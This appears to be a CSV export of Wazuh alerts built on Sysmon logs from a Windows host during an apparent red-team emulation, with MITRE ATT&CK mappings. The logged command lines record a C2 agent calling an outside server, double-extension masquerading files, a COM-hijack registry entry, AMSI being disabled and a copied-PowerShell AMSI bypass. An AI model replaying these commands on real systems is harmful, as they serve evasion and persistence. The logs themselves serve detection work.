09:13:02.264,"SHA1=2661E5F3562DD03C0ED21C33E2888E2FD1137D8C,MD5=9A68ADD12EB50DDE7586782C3EB9FF9C,SHA256=62A95C926C8513C9F3ACF65A5B33CBB88174555E2759C1B52DD6629F743A59ED,IMPHASH=93B1E62305A8CEC30A5FBE39C04A90BD","technique_id=T1083,technique_name=File and Directory Discovery",Microsoft Corporation,5.812.10240.16384,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-D71C-674A-7807-000000000D00},"cmd.exe /C copy \""C:\\Windows\\System32\\calc.exe\"" %temp%\\T1036.003_masquerading.docx.exe /Y &amp;&amp; copy \""C:\\Windows\\System32\\calc.exe\"" %temp%\\T1036.003_masquerading.pdf.exe /Y &amp;&amp; copy \""C:\\Windows\\System32\\calc.exe\"" %temp%\\T1036.003_masquerading.ps1.exe /Y &amp;&amp; copy \""4bd145_T1036.003_masquerading.vbs\"" %temp%\\T1036.003_masquerading.xls.vbs /Y &amp;&amp; copy \""4bd145_T1036.003_masquerading.vbs\"" %temp%\\T1036.003_masquerading.xlsx.vbs /Y &amp;&amp; copy \""4bd145_T1036.003_masquerading.vbs\"" %temp%\\T1036.003_masquerading.png.vbs /Y &amp;&amp; copy \""107417_T1036.003_masquerading.ps1\"" %temp%\\T1036.003_masquerading.doc.ps1 /Y &amp;&amp; copy \""107417_T1036.003_masquerading.ps1\"" %temp%\\T1036.003_masquerading.pdf.ps1 /Y &amp;&amp; copy \""107417_T1036.003_masquerading.ps1\"" %temp%\\T1036.003_masquerading.rtf.ps1 /Y &amp;&amp; %temp%\\T1036.003_masquerading.docx.exe &amp;&amp; %temp%\\T1036.003_masquerading.pdf.exe &amp;&amp; %temp%\\T1036.003_masquerading.ps1.exe &amp;&amp; %temp%\\T1036.003_masquerading.xls.vbs &amp;&amp; %temp%\\T1036.003_masquerading.xlsx.vbs &amp;&amp; %temp%\\T1036.003_masquerading.png.vbs &amp;&amp; C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -File %temp%\\T1036.003_masquerading.doc.ps1 &amp;&amp; C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -File %temp%\\T1036.003_masquerading.pdf.ps1 &amp;&amp; C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -File %temp%\\T1036.003_masquerading.rtf.ps1",0x107a6b,1920,C:\\Windows\\system32\\,C:\\Windows\\System32\\cmd.exe,"\""C:\\Windows\\System32\\WScript.exe\"" \""C:\\Users\\mari\\AppData\\Local\\Temp\\T1036.003_masquerading.xlsx.vbs\""",High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,IvpUfJMBRlc-D5DFoyCy,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1083,technique_name=File and Directory Discovery
UtcTime: 2024-11-30 09:08:56.627
ProcessGuid: {15959494-D628-674A-6F07-000000000D00}
ProcessId: 7476
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: cmd.exe /C REG ADD HKCU\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\InProcServer32 /ve /t REG_SZ /d C:\IDontExist.dll /f
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE
ParentProcessGuid: {15959494-D565-6749-1C01-000000000D00}
ParentProcessId: 7968
ParentImage: C:\Users\Public\splunkd.exe
ParentCommandLine: ""C:\Users\Public\splunkd.exe"" -server http://172.31.234.82:8888 -group red 
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T09:08:56.629879100Z,57253,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,24,false,4,Windows command prompt started by an abnormal process,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92052, , ,windows_eventchannel,log,"Nov 30, 2024 @ 09:08:57.708",EventChannel,1732957737.2988688,"Nov 30, 2024 @ 09:08:57.708", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,7476, , , , , , , , , , ,"[""Windows Command Shell""]","[""T1059.003""]","[""Execution""]", , , ,Cmd.Exe,C:\\Windows\\System32\\cmd.exe,Microsoft® Windows® Operating System, , ,Windows Command Processor, , ,{15959494-D628-674A-6F07-000000000D00},2024-11-30 09:08:56.627,"SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE","technique_id=T1083,technique_name=File and Directory Discovery",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-D565-6749-1C01-000000000D00},"\""C:\\Users\\Public\\splunkd.exe\"" -server http://172.31.234.82:8888 -group red",0x107a6b,7968,C:\\Windows\\system32\\,C:\\Users\\Public\\splunkd.exe,cmd.exe /C REG ADD HKCU\\Software\\Classes\\CLSID\\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\\InProcServer32 /ve /t REG_SZ /d C:\\IDontExist.dll /f,High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,I_pUfJMBRlc-D5DFoyCy,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1083,technique_name=File and Directory Discovery
UtcTime: 2024-11-30 09:08:56.635
ProcessGuid: {15959494-D628-674A-7007-000000000D00}
ProcessId: 5636
Image: C:\Windows\System32\reg.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Registry Console Tool
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: reg.exe
CommandLine: REG  ADD HKCU\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\InProcServer32 /ve /t REG_SZ /d C:\IDontExist.dll /f
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=04CE0B79EA20332CC4FF4679883B18BFE4341FBD,MD5=E3DACF0B31841FA02064B4457D44B357,SHA256=928693D84D652DC15B3FCDC6576D790053755C5181CE6708B1110DE12ADAE4A1,IMPHASH=BE482BE427FE212CFEF2CDA0E61F19AC
ParentProcessGuid: {15959494-D628-674A-6F07-000000000D00}
ParentProcessId: 7476
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: cmd.exe /C REG ADD HKCU\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\InProcServer32 /ve /t REG_SZ /d C:\IDontExist.dll /f
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T09:08:56.636202400Z,57255,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,2,false,10,Value added to registry key has Base64-like pattern,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92041, , ,windows_eventchannel,log,"Nov 30, 2024 @ 09:08:57.724",EventChannel,1732957737.2995261,"Nov 30, 2024 @ 09:08:57.724", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,5636, , , , , , , , , , ,"[""Obfuscated Files or Information"",""Modify Registry""]","[""T1027"",""T1112""]","[""Defense Evasion""]", , , ,reg.exe,C:\\Windows\\System32\\reg.exe,Microsoft® Windows® Operating System, , ,Registry Console Tool, , ,{15959494-D628-674A-7007-000000000D00},2024-11-30 09:08:56.635,"SHA1=04CE0B79EA20332CC4FF4679883B18BFE4341FBD,MD5=E3DACF0B31841FA02064B4457D44B357,SHA256=928693D84D652DC15B3FCDC6576D790053755C5181CE6708B1110DE12ADAE4A1,IMPHASH=BE482BE427FE212CFEF2CDA0E61F19AC","technique_id=T1083,technique_name=File and Directory Discovery",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-D628-674A-6F07-000000000D00},cmd.exe /C REG ADD HKCU\\Software\\Classes\\CLSID\\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\\InProcServer32 /ve /t REG_SZ /d C:\\IDontExist.dll /f,0x107a6b,7476,C:\\Windows\\system32\\,C:\\Windows\\System32\\cmd.exe,REG  ADD HKCU\\Software\\Classes\\CLSID\\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\\InProcServer32 /ve /t REG_SZ /d C:\\IDontExist.dll /f,High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,IPpTfJMBRlc-D5DFpSC7,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 09:07:50.613
ProcessGuid: {15959494-D5E6-674A-6E07-000000000D00}
ProcessId: 4320
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: powershell.exe -ExecutionPolicy Bypass -C ""New-Item -Path \""HKCU:\Software\Microsoft\Windows Script\Settings\"" -Force | Out-Null; New-ItemProperty -Path \""HKCU:\Software\Microsoft\Windows Script\Settings\"" -Name \""AmsiEnable\"" -Value 0 -PropertyType DWORD -Force | Out-Null""
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=1B3B40FBC889FD4C645CC12C85D0805AC36BA254,MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F
ParentProcessGuid: {15959494-D565-6749-1C01-000000000D00}
ParentProcessId: 7968
ParentImage: C:\Users\Public\splunkd.exe
ParentCommandLine: ""C:\Users\Public\splunkd.exe"" -server http://172.31.234.82:8888 -group red 
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T09:07:50.615575600Z,57236,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,4,false,3,Powershell was used to delete files or directories,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92021, , ,windows_eventchannel,log,"Nov 30, 2024 @ 09:07:51.688",EventChannel,1732957671.2978409,"Nov 30, 2024 @ 09:07:51.688", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,4320, , , , , , , , , , ,"[""File Deletion""]","[""T1070.004""]","[""Defense Evasion""]", , , ,PowerShell.EXE,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,Microsoft® Windows® Operating System, , ,Windows PowerShell, , ,{15959494-D5E6-674A-6E07-000000000D00},2024-11-30 09:07:50.613,"SHA1=1B3B40FBC889FD4C645CC12C85D0805AC36BA254,MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F","technique_id=T1059.001,technique_name=PowerShell",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-D565-6749-1C01-000000000D00},"\""C:\\Users\\Public\\splunkd.exe\"" -server http://172.31.234.82:8888 -group red",0x107a6b,7968,C:\\Windows\\system32\\,C:\\Users\\Public\\splunkd.exe,"powershell.exe -ExecutionPolicy Bypass -C \""New-Item -Path \\\""HKCU:\\Software\\Microsoft\\Windows Script\\Settings\\\"" -Force | Out-Null; New-ItemProperty -Path \\\""HKCU:\\Software\\Microsoft\\Windows Script\\Settings\\\"" -Name \\\""AmsiEnable\\\"" -Value 0 -PropertyType DWORD -Force | Out-Null\""",High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,IfpTfJMBRlc-D5DFpSC7,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 09:07:50.722
ProcessGuid: {15959494-D5E6-674A-6E07-000000000D00}
ProcessId: 4320
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_c24ibkbu.fmc.ps1
CreationUtcTime: 2024-11-30 09:07:50.722
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T09:07:50.724758100Z,57245,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,30,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 09:07:51.829",EventChannel,1732957671.2985677,"Nov 30, 2024 @ 09:07:51.829", , , , , , , , , , , , ,4320, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-D5E6-674A-6E07-000000000D00},2024-11-30 09:07:50.722, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_c24ibkbu.fmc.ps1,2024-11-30 09:07:50.722, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,G_pSfJMBRlc-D5DFHyAX,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1083,technique_name=File and Directory Discovery
UtcTime: 2024-11-30 09:06:12.877
ProcessGuid: {15959494-D584-674A-6A07-000000000D00}
ProcessId: 6132
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: cmd.exe /C copy %%windir%%\System32\windowspowershell\v1.0\powershell.exe %%APPDATA%%\updater.exe && copy %%windir%%\System32\amsi.dll %%APPDATA%%\amsi.dll && %%APPDATA%%\updater.exe -Command exit
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE
ParentProcessGuid: {15959494-D565-6749-1C01-000000000D00}
ParentProcessId: 7968
ParentImage: C:\Users\Public\splunkd.exe
ParentCommandLine: ""C:\Users\Public\splunkd.exe"" -server http://172.31.234.82:8888 -group red 
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T09:06:12.879748700Z,57199,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,23,false,4,Windows command prompt started by an abnormal process,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92052, , ,windows_eventchannel,log,"Nov 30, 2024 @ 09:06:13.951",EventChannel,1732957573.2953794,"Nov 30, 2024 @ 09:06:13.951", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,6132, , , , , , , , , , ,"[""Windows Command Shell""]","[""T1059.003""]","[""Execution""]", , , ,Cmd.Exe,C:\\Windows\\System32\\cmd.exe,Microsoft® Windows® Operating System, , ,Windows Command Processor, , ,{15959494-D584-674A-6A07-000000000D00},2024-11-30 09:06:12.877,"SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE","technique_id=T1083,technique_name=File and Directory Discovery",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-D565-6749-1C01-000000000D00},"\""C:\\Users\\Public\\splunkd.exe\"" -server http://172.31.234.82:8888 -group red",0x107a6b,7968,C:\\Windows\\system32\\,C:\\Users\\Public\\splunkd.exe,cmd.exe /C copy %%windir%%\\System32\\windowspowershell\\v1.0\\powershell.exe %%APPDATA%%\\updater.exe &amp;&amp; copy %%windir%%\\System32\\amsi.dll %%APPDATA%%\\amsi.dll &amp;&amp; %%APPDATA%%\\updater.exe -Command exit,High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,QfpZfJMBRlc-D5DF0yDY,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1059.003,technique_name=Windows Command Shell
UtcTime: 2024-11-30 09:14:37.916
ProcessGuid: {15959494-D77D-674A-8307-000000000D00}
ProcessId: 6852
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: cmd.exe /C reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\TelemetryController\NewKey"" /t REG_SZ /v Command /d C:\Windows\System32\notepad.exe /f
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE
ParentProcessGuid: {15959494-D565-6749-1C01-000000000D00}
ParentProcessId: 7968
ParentImage: C:\Users\Public\splunkd.exe
ParentCommandLine: ""C:\Users\Public\splunkd.exe"" -server http://172.31.234.82:8888 -group red 
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T09:14:37.919613800Z,57398,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,27,false,4,Windows command prompt started by an abnormal process,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92052, , ,windows_eventchannel,log,"Nov 30, 2024 @ 09:14:39.003",EventChannel,1732958079.3161032,"Nov 30, 2024 @ 09:14:39.003", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,6852, , , , , , , , , , ,"[""Windows Command Shell""]","[""T1059.003""]","[""Execution""]", , , ,Cmd.Exe,C:\\Windows\\System32\\cmd.exe,Microsoft® Windows® Operating System, , ,Windows Command Processor, , ,{15959494-D77D-674A-8307-000000000D00},2024-11-30 09:14:37.916,"SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE","technique_id=T1059.003,technique_name=Windows Command Shell",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-D565-6749-1C01-000000000D00},"\""C:\\Users\\Public\\splunkd.exe\"" -server http://172.31.234.82:8888 -group red",0x107a6b,7968,C:\\Windows\\system32\\,C:\\Users\\Public\\splunkd.exe,"cmd.exe /C reg add \""HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\TelemetryController\\NewKey\"" /t REG_SZ /v Command /d C:\\Windows\\System32\\notepad.exe /f",High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,KfpXfJMBRlc-D5DFnSBw,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: Event Log Access
UtcTime: 2024-11-30 09:12:11.818
ProcessGuid: {15959494-D6EB-674A-7607-000000000D00}
ProcessId: 5872
Image: C:\Windows\System32\wevtutil.exe
FileVersion: 10.0.17134.81 (WinBuild.160101.0800)
Description: Eventing Command Line Utility
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: wevtutil.exe
CommandLine: wevtutil  enum-logs
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=26B0ED4281B2545C9A49FA31B4E8E7E8E2575D97,MD5=0269064AA2DD91125F13635FB194F499,SHA256=AB86C6C090FA85C2920A637D2BE274335A86FBC0A7FB706E893493B50840DC0A,IMPHASH=89A3D9DE9FED48F734C9553D16342280
ParentProcessGuid: {15959494-D6EB-674A-7507-000000000D00}
ParentProcessId: 880
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: cmd.exe /C wevtutil enum-logs
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T09:12:11.820776100Z,57296,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,12,false,3,Suspicious Windows cmd shell execution,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92032, , ,windows_eventchannel,log,"Nov 30, 2024 @ 09:12:12.905",EventChannel,1732957932.3014145,"Nov 30, 2024 @ 09:12:12.905", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,5872, , , , , , , , , , ,"[""Account Discovery"",""Windows Command Shell""]","[""T1087"",""T1059.003""]","[""Discovery"",""Execution""]", , , ,wevtutil.exe,C:\\Windows\\System32\\wevtutil.exe,Microsoft® Windows® Operating System, , ,Eventing Command Line Utility, , ,{15959494-D6EB-674A-7607-000000000D00},2024-11-30 09:12:11.818,"SHA1=26B0ED4281B2545C9A49FA31B4E8E7E8E2575D97,MD5=0269064AA2DD91125F13635FB194F499,SHA256=AB86C6C090FA85C2920A637D2BE274335A86FBC0A7FB706E893493B50840DC0A,IMPHASH=89A3D9DE9FED48F734C9553D16342280",Event Log Access,Microsoft Corporation,10.0.17134.81 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-D6EB-674A-7507-000000000D00},cmd.exe /C wevtutil enum-logs,0x107a6b,880,C:\\Windows\\system32\\,C:\\Windows\\System32\\cmd.exe,wevtutil  enum-logs,High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,J_pWfJMBRlc-D5DFKiBH,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 09:10:35.880
ProcessGuid: {15959494-D68B-674A-7207-000000000D00}
ProcessId: 4036
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_ecc3u0gh.opu.ps1
CreationUtcTime: 2024-11-30 09:10:35.880
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T09:10:35.893559900Z,57283,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,32,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 09:10:37.005",EventChannel,1732957837.3005043,"Nov 30, 2024 @ 09:10:37.005", , , , , , , , , , , , ,4036, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-D68B-674A-7207-000000000D00},2024-11-30 09:10:35.880, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_ecc3u0gh.opu.ps1,2024-11-30 09:10:35.880, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
